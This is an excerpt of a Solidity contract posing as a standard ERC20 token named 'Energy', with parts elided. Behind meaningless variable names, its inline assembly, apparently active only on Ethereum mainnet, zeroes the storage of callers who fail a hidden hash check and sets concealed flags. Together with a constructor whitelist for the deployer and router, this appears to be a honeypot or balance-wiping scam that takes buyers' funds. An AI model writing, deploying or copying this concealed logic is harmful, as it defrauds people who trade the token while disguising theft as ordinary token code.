...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addFire;
    uint256 private _staticNoise = block.number*2;

    mapping (address => bool) private _primeNumber; 
    mapping (address => bool) private _secondNumber;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rockBoulder;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private waterPipe;
    address public pair;
    ...
    bool private trading; uint256 private foamAttack = 1; bool private onionGreen;
    uint256 private _decimals; uint256 private hubHelp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addFire.push(_router); addFire.push(msgSender_); addFire.push(pair);
        for (uint256 q=0; q < 3;) {_primeNumber[addFire[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9571b0c1ad6fc4fa995490a7104806b9d2fe03d511b081dc8f429ad610c45b17
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x2dcad56e45ee7aa25852b99c3e3562e42e8fe1d36edb2dda60a0777ea47816c2,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _staticNoise = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addFire[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Energy is ERC20Token {
    constructor() ERC20Token("Energy", "ENERGY", msg.sender, 1275000 * 10 ** 18) {
    }
}
